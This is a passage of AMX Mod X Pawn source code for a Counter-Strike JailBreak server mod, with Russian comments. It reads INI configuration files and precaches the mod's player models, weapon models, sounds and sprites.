	MACHETE_STAB,
	MACHETE_HIT,
	SERP_DEPLOY,
	SERP_HITWELL,
	SERP_SLASH,
	SERP_STAB,
	SERP_HIT
}
new g_szSounds[MAX_SOUNDS][64];

enum _:MAX_MODELS 
{ 
	P_SHARPENING,
	V_SHARPENING,
	P_SCREWDRIVER,
	V_SCREWDRIVER,
	P_BALISONG,
	V_BALISONG,
	P_MACHETE,
	V_MACHETE,
	P_SERP,
	V_SERP
}
new g_szModels[MAX_MODELS][64];

/*===== -> Файлы -> =====*///{
files_precache()
{
	new szCfgDir[64], szCfgFile[128];
	get_localinfo("amxx_configsdir", szCfgDir, charsmax(szCfgDir));
	formatex(szCfgFile, charsmax(szCfgFile), "%s/jb_engine/costume_models.ini", szCfgDir);
	switch(file_exists(szCfgFile))
	{
		case 0: log_to_file("%s/jb_engine/log_error.log", "File ^"%s^" not found!", szCfgDir, szCfgFile);
		case 1: jbe_costume_models_read_file(szCfgFile);
	}
	formatex(szCfgFile, charsmax(szCfgFile), "%s/jb_engine/round_sound.ini", szCfgDir);
	switch(file_exists(szCfgFile))
	{
		case 0: log_to_file("%s/jb_engine/log_error.log", "File ^"%s^" not found!", szCfgDir, szCfgFile);
		case 1: jbe_round_sound_read_file(szCfgFile);
	}
	// Музыка для меню
	formatex(szCfgFile, charsmax(szCfgFile), "%s/jb_engine/simon_music.ini", szCfgDir);
	switch(file_exists(szCfgFile))
	{
		case 0: log_to_file("%s/jb_engine/log_error.log", "File ^"%s^" not found!", szCfgDir, szCfgFile);
		case 1:
		{
			new aDataMusic[DATA_MUSIC], szBuffer[128], iLine, iLen;
			g_aDataMusicList = ArrayCreate(DATA_MUSIC);
			while(read_file(szCfgFile, iLine++, szBuffer, charsmax(szBuffer), iLen))
			{
				if(!iLen || szBuffer[0] == ';') continue;
				parse
				(
					szBuffer, 
					aDataMusic[FILE_DIR], charsmax(aDataMusic[FILE_DIR]), 
					aDataMusic[MUSIC_NAME], charsmax(aDataMusic[MUSIC_NAME])
				);
				formatex(szBuffer, charsmax(szBuffer), "sound/jb_engine/smn_msc/%s.mp3", aDataMusic[FILE_DIR]);
				engfunc(EngFunc_PrecacheGeneric, szBuffer);
				ArrayPushArray(g_aDataMusicList, aDataMusic);
			}
			g_iListMusicSize = ArraySize(g_aDataMusicList);
		}
	}
// Костюмчики
	formatex(szCfgFile, charsmax(szCfgFile), "%s/jb_engine/costumes_list.ini", szCfgDir);
	switch(file_exists(szCfgFile))
	{
		case 0: log_to_file("%s/jb_engine/log_error.log", "File ^"%s^" not found!", szCfgDir, szCfgFile);
		case 1:
		{
			new aDataCostumesRead[DATA_COSTUMES_PRECACHE], szBuffer[256], iLine, iLen;
			g_aCostumesList = ArrayCreate(DATA_COSTUMES_PRECACHE);
			while(read_file(szCfgFile, iLine++, szBuffer, charsmax(szBuffer), iLen))
			{
				if(!iLen || szBuffer[0] == ';') continue;
				parse
				(
					szBuffer, 
					aDataCostumesRead[MODEL_NAME], 		charsmax(aDataCostumesRead[MODEL_NAME]), 
					aDataCostumesRead[SUB_MODEL], 		charsmax(aDataCostumesRead[SUB_MODEL]),
					aDataCostumesRead[NAME_COSTUME],	charsmax(aDataCostumesRead[NAME_COSTUME]),
					aDataCostumesRead[FLAG_COSTUME],	charsmax(aDataCostumesRead[FLAG_COSTUME]),
					aDataCostumesRead[WARNING_MSG],		charsmax(aDataCostumesRead[WARNING_MSG])
				);
				format(szBuffer, charsmax(szBuffer), "models/jb_engine/costumes/%s.mdl", aDataCostumesRead[MODEL_NAME]);
				if(file_exists(szBuffer)) engfunc(EngFunc_PrecacheModel, szBuffer);
				ArrayPushArray(g_aCostumesList, aDataCostumesRead);
			}
			g_iCostumesListSize = ArraySize(g_aCostumesList);
		}
	}
// Модели зеков по NICK | STEAM ID
#if defined SKINS_DATA
	formatex(szCfgFile, charsmax(szCfgFile), "%s/jb_engine/users_models.ini", szCfgDir);
	switch(file_exists(szCfgFile))
	{
		case 0: log_to_file("%s/jb_engine/log_error.log", "File ^"%s^" not found!", szCfgDir, szCfgFile);
		case 1:
		{
			new aDataModelUserData[DATA_MODEL_SKIN], szBuffer[256], iLine, iLen;
			new iData[12], szText[64]; get_time("%d%m%Y", iData, charsmax(iData));
			g_aModelUserData = ArrayCreate(DATA_MODEL_SKIN);
			while(read_file(szCfgFile, iLine++, szBuffer, charsmax(szBuffer), iLen))
			{
				if(!iLen || szBuffer[0] == ';') continue;
				parse
				(
					szBuffer, 
					aDataModelUserData[TYPE_AUTH],				charsmax(aDataModelUserData[TYPE_AUTH]), 
					aDataModelUserData[USER_INFO],				charsmax(aDataModelUserData[USER_INFO]),
					aDataModelUserData[MODEL_USER],				charsmax(aDataModelUserData[MODEL_USER]),
					aDataModelUserData[DAY_LEFT],				charsmax(aDataModelUserData[DAY_LEFT])
				);
				trim(aDataModelUserData[DAY_LEFT]);
				replace_all(aDataModelUserData[DAY_LEFT], charsmax(aDataModelUserData[DAY_LEFT]), "/", "");
				if(equal(iData, aDataModelUserData[DAY_LEFT]))
				{
					formatex(szText, charsmax(szText), ";^"%s^" ^"%s^" ^"%s^" ^"Окончено^"", aDataModelUserData[TYPE_AUTH],  aDataModelUserData[USER_INFO], aDataModelUserData[MODEL_USER]);
					write_file(szCfgFile, szText, iLine - 1);
					continue;
				}
				format(szBuffer, charsmax(szBuffer), "models/player/%s/%s.mdl", aDataModelUserData[MODEL_USER], aDataModelUserData[MODEL_USER]);
				if(file_exists(szBuffer)) engfunc(EngFunc_PrecacheModel, szBuffer);
				ArrayPushArray(g_aModelUserData, aDataModelUserData);
			}
			g_iModelUserData = ArraySize(g_aModelUserData);
		}
	}
#endif

// CONFIG.INI
	formatex(szCfgFile, charsmax(szCfgFile), "%s/jb_engine/config.ini", szCfgDir);
	if(!file_exists(szCfgFile))
	{
		new szError[100];
		formatex(szError, charsmax(szError), "[JBL] Отсутсвтует: %s!", szCfgFile);
		set_fail_state(szError);
		return;
	}
	new szBuffer[128], szKey[64], szValue[960], iSectrion;
	new iFile = fopen(szCfgFile, "rt");
	while(iFile && !feof(iFile))
	{
		fgets(iFile, szBuffer, charsmax(szBuffer));
		replace(szBuffer, charsmax(szBuffer), "^n", "");
		if(!szBuffer[0] || szBuffer[0] == ';' || szBuffer[0] == '{' || szBuffer[0] == '}' || szBuffer[0] == '#') continue;
		if(szBuffer[0] == '[')
		{
			iSectrion++;
			continue;
		}
		parse(szBuffer, szKey, charsmax(szKey), szValue, charsmax(szValue));
		trim(szKey);
		trim(szValue);
		switch (iSectrion)
		{
			case SELECT_ACCESS_FLAGS:
			{
				if(equal(szKey, "HOOK"))			    g_iFlagAccess[HOOK] 		= read_flags(szValue);
				else if(equal(szKey, "VIP"))		    g_iFlagAccess[VIP] 	        = read_flags(szValue);
				else if(equal(szKey, "ADMIN"))		    g_iFlagAccess[ADMIN] 	    = read_flags(szValue);
				else if(equal(szKey, "PREMIUM"))	    g_iFlagAccess[PREMIUM] 	    = read_flags(szValue);
				else if(equal(szKey, "ELITE"))		    g_iFlagAccess[ELITE] 	    = read_flags(szValue);
				else if(equal(szKey, "ALPHA"))			g_iFlagAccess[ALPHA] 		= read_flags(szValue);
				else if(equal(szKey, "STRAJNIK"))		g_iFlagAccess[STRAJNIK] 	= read_flags(szValue);
				else if(equal(szKey, "SUPER_SIMON"))	g_iFlagAccess[SUPER_SIMON] 	= read_flags(szValue);
				else if(equal(szKey, "DELTA"))		    g_iFlagAccess[DELTA] 	    = read_flags(szValue);
				else if(equal(szKey, "DYAVOL"))		    g_iFlagAccess[DYAVOL] 	    = read_flags(szValue);
				else if(equal(szKey, "PREZIDENT"))		g_iFlagAccess[PREZIDENT] 	= read_flags(szValue);
				else if(equal(szKey, "DEMONES"))	    g_iFlagAccess[DEMONES] 	    = read_flags(szValue);
				else if(equal(szKey, "CLOUN"))	        g_iFlagAccess[CLOUN] 	    = read_flags(szValue);
			}
			case SELECT_PRISON:
			{
				if(equal(szKey, "MDL_PR"))				copy(g_szPlayerModel[PRISONER], 	charsmax(g_szPlayerModel[]), szValue);
				else if(equal(szKey, "MDL_FB")) 		copy(g_szPlayerModel[FOOTBALLER], 	charsmax(g_szPlayerModel[]), szValue);
				else if(equal(szKey, "MDL_ST"))		    copy(g_szPlayerModel[STRAJ], 	    charsmax(g_szPlayerModel[]), szValue);
				else if(equal(szKey, "MDL_CL"))		    copy(g_szPlayerModel[CLOUNES], 	    charsmax(g_szPlayerModel[]), szValue);
				else if(equal(szKey, "MDL_PH"))		    copy(g_szPlayerModel[PAHAN], 	    charsmax(g_szPlayerModel[]), szValue);
				else if(equal(szKey, "P_HAND_PR")) 		copy(g_szPlayerHand[PRISONER_P], 	charsmax(g_szPlayerHand[]), szValue);
				else if(equal(szKey, "V_HAND_PR")) 		copy(g_szPlayerHand[PRISONER_V], 	charsmax(g_szPlayerHand[]), szValue);
				else if(equal(szKey, "P_CUFF_PR")) 		copy(g_szPlayerHand[CUFF_P], 	    charsmax(g_szPlayerHand[]), szValue);
				else if(equal(szKey, "V_CUFF_PR")) 		copy(g_szPlayerHand[CUFF_V], 	    charsmax(g_szPlayerHand[]), szValue);
			}
			case SELECT_GUARD:
			{
				if(equal(szKey, "MDL_GUARD"))			copy(g_szPlayerModel[GUARD], 	charsmax(g_szPlayerModel[]), szValue);
				else if(equal(szKey, "MDL_CHIEF"))		copy(g_szPlayerModel[CHIEF], 	charsmax(g_szPlayerModel[]), szValue);
				else if(equal(szKey, "MDL_DV"))		    copy(g_szPlayerModel[DEMON], 	charsmax(g_szPlayerModel[]), szValue);
				else if(equal(szKey, "P_HAND_GR")) 		copy(g_szPlayerHand[GUARD_P],	charsmax(g_szPlayerHand[]), szValue);
				else if(equal(szKey, "V_HAND_GR")) 		copy(g_szPlayerHand[GUARD_V],	charsmax(g_szPlayerHand[]), szValue);
				else if(equal(szKey, "P_SHOCKER")) 		copy(g_szPlayerHand[SHOCKER_P],	charsmax(g_szPlayerHand[]), szValue);
				else if(equal(szKey, "V_SHOCKER")) 		copy(g_szPlayerHand[SHOCKER_V],	charsmax(g_szPlayerHand[]), szValue);
			}
		}
	}
	fclose(iFile);
	
// PRECACHE.INI
	formatex(szCfgFile, charsmax(szCfgFile), "%s/jb_engine/precache.ini", szCfgDir);
	if(!file_exists(szCfgFile))
	{
		new szError[100];
		formatex(szError, charsmax(szError), "[L-JB] Отсутсвтует: %s!", szCfgFile);
		set_fail_state(szError);
		return;
	}
	iSectrion = 0;
	iFile = fopen(szCfgFile, "rt");
	while(iFile && !feof(iFile))
	{
		fgets(iFile, szBuffer, charsmax(szBuffer));
		replace(szBuffer, charsmax(szBuffer), "^n", "");
		if(!szBuffer[0] || szBuffer[0] == ';' || szBuffer[0] == '{' || szBuffer[0] == '}' || szBuffer[0] == '#') continue;
		if(szBuffer[0] == '[')
		{
			iSectrion++;
			continue;
		}
		parse(szBuffer, szKey, charsmax(szKey), szValue, charsmax(szValue));
		trim(szKey);
		trim(szValue);
		switch(iSectrion)
		{
			case SELECT_SOUNDS:
			{
			    if(equal(szKey, "PRISON_RIOT")) 				    formatex(g_szSounds[PRISON_RIOT], 				charsmax(g_szSounds[]), szValue);
				else if(equal(szKey, "FD_START")) 				    formatex(g_szSounds[FD_START], 			        charsmax(g_szSounds[]), szValue);
				else if(equal(szKey, "FD_END")) 				    formatex(g_szSounds[FD_END], 			        charsmax(g_szSounds[]), szValue);
				else if(equal(szKey, "CHIEF_GOLOS")) 				formatex(g_szSounds[CHIEF_GOLOS], 			    charsmax(g_szSounds[]), szValue);
				else if(equal(szKey, "NEW_SIMON")) 				    formatex(g_szSounds[NEW_SIMON], 			    charsmax(g_szSounds[]), szValue);
				else if(equal(szKey, "SIMON_DISCON")) 				formatex(g_szSounds[SIMON_DISCON], 			    charsmax(g_szSounds[]), szValue);
				else if(equal(szKey, "PRIV_RES")) 				    formatex(g_szSounds[PRIV_RES], 			        charsmax(g_szSounds[]), szValue);
				else if(equal(szKey, "FD_PLAYER")) 				    formatex(g_szSounds[FD_PLAYER], 			    charsmax(g_szSounds[]), szValue);
				else if(equal(szKey, "BUY_SHOP")) 				    formatex(g_szSounds[BUY_SHOP], 			        charsmax(g_szSounds[]), szValue);
				else if(equal(szKey, "LAST_DIE_COUNTDOWN")) 		formatex(g_szSounds[LAST_DIE_COUNTDOWN], 	    charsmax(g_szSounds[]), szValue);
				else if(equal(szKey, "SIMON_SVISTOK")) 				formatex(g_szSounds[SIMON_SVISTOK], 			charsmax(g_szSounds[]), szValue);
				else if(equal(szKey, "CHYKA_STOP")) 				formatex(g_szSounds[CHYKA_STOP], 			    charsmax(g_szSounds[]), szValue);
				else if(equal(szKey, "DUEL_START")) 			    formatex(g_szSounds[DUEL_START], 			    charsmax(g_szSounds[]), szValue); 
				else if(equal(szKey, "MENU_CLICK")) 			    formatex(g_szSounds[MENU_CLICK], 			    charsmax(g_szSounds[]), szValue); 
				else if(equal(szKey, "BLOCK_ADD")) 			        formatex(g_szSounds[BLOCK_ADD], 			    charsmax(g_szSounds[]), szValue); 
			    else if(equal(szKey, "CLOUN_CMEX")) 			    formatex(g_szSounds[CLOUN_CMEX], 			    charsmax(g_szSounds[]), szValue); 
   			    else if(equal(szKey, "GIVE_PAHAN")) 			    formatex(g_szSounds[GIVE_PAHAN], 			    charsmax(g_szSounds[]), szValue);
				else if(equal(szKey, "BALISONG_DEPLOY"))            formatex(g_szSounds[BALISONG_DEPLOY], 			charsmax(g_szSounds[]), szValue);
			    else if(equal(szKey, "BALISONG_HITWELL"))           formatex(g_szSounds[BALISONG_HITWELL], 			charsmax(g_szSounds[]), szValue);
			    else if(equal(szKey, "BALISONG_SLASH"))             formatex(g_szSounds[BALISONG_SLASH], 			charsmax(g_szSounds[]), szValue);
			    else if(equal(szKey, "BALISONG_STAB"))              formatex(g_szSounds[BALISONG_STAB], 		    charsmax(g_szSounds[]), szValue);
				else if(equal(szKey, "BALISONG_HIT")) 				formatex(g_szSounds[BALISONG_HIT], 				charsmax(g_szSounds[]), szValue); 
                else if(equal(szKey, "ULTRAHAND_DEPLOY"))           formatex(g_szSounds[ULTRAHAND_DEPLOY], 			charsmax(g_szSounds[]), szValue);
			    else if(equal(szKey, "ULTRAHAND_HITWALL"))          formatex(g_szSounds[ULTRAHAND_HITWALL], 		charsmax(g_szSounds[]), szValue);
			    else if(equal(szKey, "ULTRAHAND_SLASH"))            formatex(g_szSounds[ULTRAHAND_SLASH], 			charsmax(g_szSounds[]), szValue);
			    else if(equal(szKey, "ULTRAHAND_STAB"))             formatex(g_szSounds[ULTRAHAND_STAB], 		    charsmax(g_szSounds[]), szValue);
				else if(equal(szKey, "ULTRAHAND_HIT")) 				formatex(g_szSounds[ULTRAHAND_HIT], 			charsmax(g_szSounds[]), szValue); 
				else if(equal(szKey, "ZEKIRA_DEPLOY"))              formatex(g_szSounds[ZEKIRA_DEPLOY], 			charsmax(g_szSounds[]), szValue);
			    else if(equal(szKey, "ZEKIRA_HITWALL"))             formatex(g_szSounds[ZEKIRA_HITWALL], 		    charsmax(g_szSounds[]), szValue);
			    else if(equal(szKey, "ZEKIRA_SLASH"))               formatex(g_szSounds[ZEKIRA_SLASH], 			    charsmax(g_szSounds[]), szValue);
			    else if(equal(szKey, "ZEKIRA_STAB"))                formatex(g_szSounds[ZEKIRA_STAB], 		        charsmax(g_szSounds[]), szValue);
				else if(equal(szKey, "ZEKIRA_HIT")) 			    formatex(g_szSounds[ZEKIRA_HIT], 			    charsmax(g_szSounds[]), szValue); 
				else if(equal(szKey, "SHOCKER_DEPLOY"))             formatex(g_szSounds[SHOCKER_DEPLOY], 			charsmax(g_szSounds[]), szValue);
			    else if(equal(szKey, "SHOCKER_HITWALL"))            formatex(g_szSounds[SHOCKER_HITWALL], 		    charsmax(g_szSounds[]), szValue);
			    else if(equal(szKey, "SHOCKER_SLASH"))              formatex(g_szSounds[SHOCKER_SLASH], 			charsmax(g_szSounds[]), szValue);
			    else if(equal(szKey, "SHOCKER_HIT"))                formatex(g_szSounds[SHOCKER_HIT], 		        charsmax(g_szSounds[]), szValue);
			    else if(equal(szKey, "MACHETE_DEPLOY"))             formatex(g_szSounds[MACHETE_DEPLOY], 			charsmax(g_szSounds[]), szValue);
			    else if(equal(szKey, "MACHETE_HITWELL"))            formatex(g_szSounds[MACHETE_HITWELL], 			charsmax(g_szSounds[]), szValue);
			    else if(equal(szKey, "MACHETE_SLASH"))              formatex(g_szSounds[MACHETE_SLASH], 		 	charsmax(g_szSounds[]), szValue);
			    else if(equal(szKey, "MACHETE_STAB"))               formatex(g_szSounds[MACHETE_STAB], 		        charsmax(g_szSounds[]), szValue);
				else if(equal(szKey, "MACHETE_HIT")) 				formatex(g_szSounds[MACHETE_HIT], 				charsmax(g_szSounds[]), szValue); 
			    else if(equal(szKey, "SERP_DEPLOY"))               formatex(g_szSounds[SERP_DEPLOY], 			charsmax(g_szSounds[]), szValue);
			    else if(equal(szKey, "SERP_HITWELL"))              formatex(g_szSounds[SERP_HITWELL], 			charsmax(g_szSounds[]), szValue);
			    else if(equal(szKey, "SERP_SLASH"))                formatex(g_szSounds[SERP_SLASH], 		 	charsmax(g_szSounds[]), szValue);
			    else if(equal(szKey, "SERP_STAB"))                 formatex(g_szSounds[SERP_STAB], 		        charsmax(g_szSounds[]), szValue);
				else if(equal(szKey, "SERP_HIT")) 				   formatex(g_szSounds[SERP_HIT], 				charsmax(g_szSounds[]), szValue); 
			}
			case SELECT_MODELES:
			{
				if(equal(szKey, "P_SHARPENING"))					formatex(g_szModels[P_SHARPENING],				charsmax(g_szModels[]), szValue);
				else if(equal(szKey, "V_SHARPENING"))				formatex(g_szModels[V_SHARPENING], 				charsmax(g_szModels[]), szValue);
				else if(equal(szKey, "P_SCREWDRIVER"))				formatex(g_szModels[P_SCREWDRIVER],				charsmax(g_szModels[]), szValue);
				else if(equal(szKey, "V_SCREWDRIVER"))				formatex(g_szModels[V_SCREWDRIVER], 			charsmax(g_szModels[]), szValue);
				else if(equal(szKey, "P_BALISONG"))				    formatex(g_szModels[P_BALISONG],				charsmax(g_szModels[]), szValue);
				else if(equal(szKey, "V_BALISONG"))				    formatex(g_szModels[V_BALISONG], 			    charsmax(g_szModels[]), szValue);
			    else if(equal(szKey, "P_MACHETE"))				    formatex(g_szModels[P_MACHETE],				    charsmax(g_szModels[]), szValue);
				else if(equal(szKey, "V_MACHETE"))				    formatex(g_szModels[V_MACHETE], 			    charsmax(g_szModels[]), szValue);
			    else if(equal(szKey, "P_SERP"))				        formatex(g_szModels[P_SERP],				    charsmax(g_szModels[]), szValue);
				else if(equal(szKey, "V_SERP"))				        formatex(g_szModels[V_SERP], 			        charsmax(g_szModels[]), szValue);
			}
		}
	}	
	fclose(iFile);
	
	models_precache();
	sounds_precache();
}

jbe_costume_models_read_file(szCfgFile[])
{
	new szBuffer[64], iLine, iLen;
	g_aCostumesList = ArrayCreate(64);
	while(read_file(szCfgFile, iLine++, szBuffer, charsmax(szBuffer), iLen))
	{
		if(!iLen || iLen > 32 || szBuffer[0] == ';') continue;
		format(szBuffer, charsmax(szBuffer), "models/jb_engine/costumes/%s.mdl", szBuffer);
		ArrayPushString(g_aCostumesList, szBuffer);
		engfunc(EngFunc_PrecacheModel, szBuffer);
	}
	g_iCostumesListSize = ArraySize(g_aCostumesList);
}

jbe_round_sound_read_file(szCfgFile[])
{
	new aDataRoundSound[DATA_ROUND_SOUND], szBuffer[128], iLine, iLen;
	g_aDataRoundSound = ArrayCreate(DATA_ROUND_SOUND);
	while(read_file(szCfgFile, iLine++, szBuffer, charsmax(szBuffer), iLen))
	{
		if(!iLen || szBuffer[0] == ';') continue;
		parse(szBuffer, aDataRoundSound[FILE_NAME], charsmax(aDataRoundSound[FILE_NAME]), aDataRoundSound[TRACK_NAME], charsmax(aDataRoundSound[TRACK_NAME]));
		formatex(szBuffer, charsmax(szBuffer), "sound/jb_engine/round_sound/%s.mp3", aDataRoundSound[FILE_NAME]);
		engfunc(EngFunc_PrecacheGeneric, szBuffer);
		ArrayPushArray(g_aDataRoundSound, aDataRoundSound);
	}
	g_iRoundSoundSize = ArraySize(g_aDataRoundSound);
}
/*===== <- Файлы <- =====*///}

/*===== -> Модели -> =====*///{
models_precache()
{
	new i, szBuffer[64];
	new const szBoxing[][] = {"v_boxing_gloves_red", "p_boxing_gloves_red", "v_boxing_gloves_blue", "p_boxing_gloves_blue"};
	for(i = 0; i < sizeof(szBoxing); i++)
	{
		formatex(szBuffer, charsmax(szBuffer), "models/jb_engine/boxing/%s.mdl", szBoxing[i]);
		engfunc(EngFunc_PrecacheModel, szBuffer);
	}
	engfunc(EngFunc_PrecacheModel, "models/jb_engine/soccer/ball.mdl");
	engfunc(EngFunc_PrecacheModel, "models/jb_engine/soccer/v_hand_ball.mdl");
	g_pModelGlass = engfunc(EngFunc_PrecacheModel, "models/glassgibs.mdl");
	engfunc(EngFunc_PrecacheModel, g_szModelPortal);
	engfunc(EngFunc_PrecacheModel, g_szModelChicken);
	
	// Руки 
	engfunc(EngFunc_PrecacheModel, g_szPlayerHand[PRISONER_P]);
	engfunc(EngFunc_PrecacheModel, g_szPlayerHand[PRISONER_V]);
	
	engfunc(EngFunc_PrecacheModel, g_szPlayerHand[GUARD_P]);
	engfunc(EngFunc_PrecacheModel, g_szPlayerHand[GUARD_V]);
	
	engfunc(EngFunc_PrecacheModel, g_szPlayerHand[CUFF_P]);
	engfunc(EngFunc_PrecacheModel, g_szPlayerHand[CUFF_V]);
	
	engfunc(EngFunc_PrecacheModel, g_szPlayerHand[SHOCKER_P]);
	engfunc(EngFunc_PrecacheModel, g_szPlayerHand[SHOCKER_V]);
	
	engfunc(EngFunc_PrecacheModel, g_szModels[P_SHARPENING]);
	engfunc(EngFunc_PrecacheModel, g_szModels[V_SHARPENING]);
	
	engfunc(EngFunc_PrecacheModel, g_szModels[P_SCREWDRIVER]);
	engfunc(EngFunc_PrecacheModel, g_szModels[V_SCREWDRIVER]);
	
	engfunc(EngFunc_PrecacheModel, g_szModels[P_BALISONG]);
	engfunc(EngFunc_PrecacheModel, g_szModels[V_BALISONG]);
	
	engfunc(EngFunc_PrecacheModel, g_szModels[P_MACHETE]);
	engfunc(EngFunc_PrecacheModel, g_szModels[V_MACHETE]);
	
	engfunc(EngFunc_PrecacheModel, g_szModels[P_SERP]);
	engfunc(EngFunc_PrecacheModel, g_szModels[V_SERP]);
	
	// Модели игроков
	for(new i = 0, szBuffer[64]; i < 8; i++)
	{
		formatex(szBuffer, charsmax(szBuffer), "models/player/%s/%s.mdl", g_szPlayerModel[i], g_szPlayerModel[i]);
		engfunc(EngFunc_PrecacheModel, szBuffer);
	}
	
	new const szModelBlock[][] =
	{
		"bs_gold",
		"bs_cacke",
		"bs_glass",
		"bs_stn_slab",
		"bsa_ice",
		"bsa_obs",
		"spleef_snow"
	};
	for(new i; i < sizeof(szModelBlock); i++)
	{
		formatex(szBuffer, charsmax(szBuffer), "models/jb_engine/build/%s.mdl", szModelBlock[i]);
		g_ModelBlockIndex[i] = engfunc(EngFunc_PrecacheModel, szBuffer);
	}
}
/*===== <- Модели <- =====*///}

/*===== -> Звуки -> =====*///{
sounds_precache()
{
	new i, szBuffer[64];
	for(i = 0; i <= 15; i++)
	{
		formatex(szBuffer, charsmax(szBuffer), "jb_engine/zone_cntdwn_robo/%d.wav", i);
		engfunc(EngFunc_PrecacheSound, szBuffer);
	}
	new const szSoccer[][] = {"bounce_ball", "grab_ball", "kick_ball", "whitle_start", "whitle_end", "crowd"};
	for(i = 0; i < sizeof(szSoccer); i++)
	{
		formatex(szBuffer, charsmax(szBuffer), "jb_engine/soccer/%s.wav", szSoccer[i]);
		engfunc(EngFunc_PrecacheSound, szBuffer);
	}
	new const szBoxing[][] = {"gloves_hit", "super_hit", "gong"};
	for(i = 0; i < sizeof(szBoxing); i++)
	{
		formatex(szBuffer, charsmax(szBuffer), "jb_engine/boxing/%s.wav", szBoxing[i]);
		engfunc(EngFunc_PrecacheSound, szBuffer);
	}
	new const szShop[][] = {"grenade_frost_explosion", "freeze_player", "defrost_player"};
	for(i = 0; i < sizeof(szShop); i++)
	{
		formatex(szBuffer, charsmax(szBuffer), "jb_engine/shop/%s.wav", szShop[i]);
		engfunc(EngFunc_PrecacheSound, szBuffer);
	}
	new const szHand[][] = {"hand_hit", "hand_slash", "hand_deploy"};
	for(i = 0; i < sizeof(szHand); i++)
	{
		formatex(szBuffer, charsmax(szBuffer), "jb_engine/weapons/%s.wav", szHand[i]);
		engfunc(EngFunc_PrecacheSound, szBuffer);
	}
	new const szBaton[][] = {"baton_deploy", "baton_hitwall", "baton_slash", "baton_stab", "baton_hit"};
	for(i = 0; i < sizeof(szBaton); i++)
	{
		formatex(szBuffer, charsmax(szBuffer), "jb_engine/weapons/%s.wav", szBaton[i]);
		engfunc(EngFunc_PrecacheSound, szBuffer);
	}
	new const szDayMp3[][] = {"music_game1", "music_game2", "music_game3", "music_game4"};
	for(i = 0; i < sizeof(szDayMp3); i++)
	{
		formatex(szBuffer, charsmax(szBuffer), "jb_engine/days_mode/music_game/%s.mp3", szDayMp3[i]);
		engfunc(EngFunc_PrecacheSound, szBuffer);
	}
	for(new i; i < sizeof(g_szHookSound); i++) precache_sound(g_szHookSound[i][1]);
	for(new i; i < sizeof(g_szFlySound); i++) precache_sound(g_szFlySound[i][1]);
	
	engfunc(EngFunc_PrecacheSound, "jb_engine/pook.wav");
	
	engfunc(EngFunc_PrecacheSound, g_szSounds[PRISON_RIOT]); 
	engfunc(EngFunc_PrecacheSound, g_szSounds[FD_START]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[FD_END]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[CHIEF_GOLOS]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[NEW_SIMON]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[SIMON_DISCON]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[PRIV_RES]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[FD_PLAYER]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[BUY_SHOP]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[LAST_DIE_COUNTDOWN]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[SIMON_SVISTOK]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[CHYKA_STOP]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[DUEL_START]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[BLOCK_ADD]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[CLOUN_CMEX]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[GIVE_PAHAN]);
	
	engfunc(EngFunc_PrecacheSound, g_szSounds[BALISONG_DEPLOY]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[BALISONG_HITWELL]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[BALISONG_SLASH]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[BALISONG_STAB]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[BALISONG_HIT]);
	
	engfunc(EngFunc_PrecacheSound, g_szSounds[ULTRAHAND_DEPLOY]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[ULTRAHAND_HITWALL]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[ULTRAHAND_SLASH]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[ULTRAHAND_STAB]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[ULTRAHAND_HIT]);
  
	engfunc(EngFunc_PrecacheSound, g_szSounds[ZEKIRA_DEPLOY]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[ZEKIRA_HITWALL]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[ZEKIRA_SLASH]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[ZEKIRA_STAB]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[ZEKIRA_HIT]);
	
	engfunc(EngFunc_PrecacheSound, g_szSounds[SHOCKER_DEPLOY]);
    engfunc(EngFunc_PrecacheSound, g_szSounds[SHOCKER_HITWALL]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[SHOCKER_SLASH]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[SHOCKER_HIT]);
	
	engfunc(EngFunc_PrecacheSound, g_szSounds[MACHETE_DEPLOY]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[MACHETE_HITWELL]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[MACHETE_SLASH]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[MACHETE_STAB]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[MACHETE_HIT]);
	
	engfunc(EngFunc_PrecacheSound, g_szSounds[SERP_DEPLOY]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[SERP_HITWELL]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[SERP_SLASH]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[SERP_STAB]);
	engfunc(EngFunc_PrecacheSound, g_szSounds[SERP_HIT]);
}
/*===== <- Звуки <- =====*///}

/*===== -> Спрайты -> =====*///{
sprites_precache()
{
	g_pSpriteWave = engfunc(EngFunc_PrecacheModel, "sprites/shockwave.spr");
	g_pSpriteBeam = engfunc(EngFunc_PrecacheModel, "sprites/laserbeam.spr");
	g_pSpriteBall = engfunc(EngFunc_PrecacheModel, "sprites/jb_engine/ball.spr");
	g_pSpriteDuelRed = engfunc(EngFunc_PrecacheModel, "sprites/jb_engine/duel_red.spr");
	g_pSpriteDuelBlue = engfunc(EngFunc_PrecacheModel, "sprites/jb_engine/duel_blue.spr");
	g_pSpriteLgtning = engfunc(EngFunc_PrecacheModel, "sprites/richo2.spr");
